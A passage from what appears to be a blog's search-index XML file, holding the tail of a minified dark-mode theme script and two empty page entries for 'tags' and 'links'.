t(){document.getElementsByTagName('html')[0].getAttribute('data-theme')=='dark'&&u(),window.requestAnimationFrame(t)}()};dark()]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>标签</title>
      <link href="/tags/index.html"/>
      <url>/tags/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>店长们</title>
      <link href="/link/index.html"/>
      <url>/link/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
  
</search>
